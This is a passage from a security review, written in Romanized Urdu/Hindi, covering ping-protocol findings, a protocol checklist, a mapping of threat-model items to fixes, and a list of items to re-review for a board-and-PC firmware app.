- **Attack/failure scenario:** PC ka ping sender bug ki wajah se 200 Hz par
  ping bhejne lage to board ki rate limit har waqt trigger hogi aur asal
  measurement kharab hogi; UI thread block ho to app freeze hogi.
- **Fix direction:** Sender 1–4 Hz, ephemeral port (T10), timeout +
  give-up; jawab na aaye to "unmeasured" dikhao, board-failure nahi; ping
  ko UI thread par kabhi na chalao; raw ping payload kabhi log na karo.

### SEC-C-25 — Low — Ping se nikla clock offset kabhi security faislay ke liye istemal na ho
- **File:line:** (design — SW-13).
- **Attack scenario:** Attacker jhooti timestamps bhej kar PC ke clock-offset
  hisaab ko bigar sakta hai. Agar ye offset replay window ya kisi expiry
  check mein istemal ho to security faisla attacker ke control mein chala
  jata hai.
- **Fix direction:** Offset sirf SLO display (E2E latency) ke liye hai.
  Protocol doc mein likho: ping timestamps **untrusted measurement** hain;
  in se koi auth/replay/expiry faisla nahi hoga. Ping packet ka magic
  stream/control se alag ho (misal `"RSHP"`) aur ping kabhi HELO ka 2 s
  silence timer reset **na** kare aur kabhi koi state/config na badle —
  ping sirf jawab de, kuch aur nahi.

### Ping protocol doc mein kya hona chahiye (checklist — Architecture team ke liye)
- [ ] Frame layout (magic, token, 4 timestamps, lengths) + port (tajweez:
  HELO wala port `4210`, taake HMAC wala control port `4212` saaf rahe).
- [ ] Board-side rate limit (numbers ke saath) + drop-when-busy rule.
- [ ] Reply ≤ request, reply sirf source address par, fixed token size.
- [ ] Ping HELO timer reset nahi karta; ping se koi state change nahi.
- [ ] Offset untrusted — sirf SLO display.
- [ ] Negative tests: flood, spoofed source, bara token, ghalat length,
  ghalat magic — sab drop, board zinda rehta hai, stream 200 Hz barqarar.

---

## 5. Threat model se mutabiqat (residual / khule nuqte)

| Threat model item | Is review mein |
|---|---|
| TM-O01 (F1, Critical) — bina auth firmware upload | Board fix Phase D ka hai; **app-side rok (SEC-C-01/04/05/06) Phase C mein lagna chahiye** — Phase D ka intezar mat karo |
| TM-O02 — badli hui image | SEC-C-01 (SHA/magic), SEC-C-06 (signature) |
| TM-O03 — OTA password brute force | SEC-C-04; rate limiting/lockout ka faisla abhi bhi OPEN hai (WP3/Phase D) |
| TM-W01 — evil twin / board binding | SEC-C-18 — `boardMac` binding abhi implement nahi |
| TM-W05 — DoS/flood | SEC-C-21/22/23/24 (ping), SEC-C-07/10 (upload flood) |
| TM-P01 — DPAPI key chori | Is review ka scope nahi (key handling Phase C/E mein implement hoga) — note: password `string` mein rakhna (SEC-C-04) isi zamray mein aata hai |
| TM-P02 — profile tampering | SEC-C-11–14, 17, 19 |
| TM-P04 — malicious file | SEC-C-01, 06, 11, 19 |
| OPEN-6 (pairing bootstrap), OPEN-13/14 (passwords) | Abhi bhi khule hain — in ke baghair SEC-C-04 ka asal hal nahi nikalta |

## 6. Kya dobara review hona chahiye

1. Frontend team ki A1 validation **jis din tree mein aaye** — is doc ke
   SEC-C-01/02/03/05/07/09 ke khilaf dobara check karo (khaas tor par:
   validation in-memory buffer par hai ya file dobara parhi jati hai?).
2. Profile v2 (`schemaVersion`/`boardMac`) + 3-generation backup jab
   implement ho — SEC-C-12/13/18 ke tests ke saath.
3. Ping ka protocol section (`PROTOCOL-V2.1.md`) likhne ke baad — §4 ki
   checklist ke khilaf; implement ke baad flood/spoof negative tests.
4. Phase D mein F1 + F9 fix ke baad — SEC-C-05/06/10 band hue ya nahi.

---

*Review scope se bahir: `RSH-handover/` aur `build/` ko haath nahi lagaya gaya;
koi code file edit nahi ki gayi; koi git command nahi chalaya gaya.*
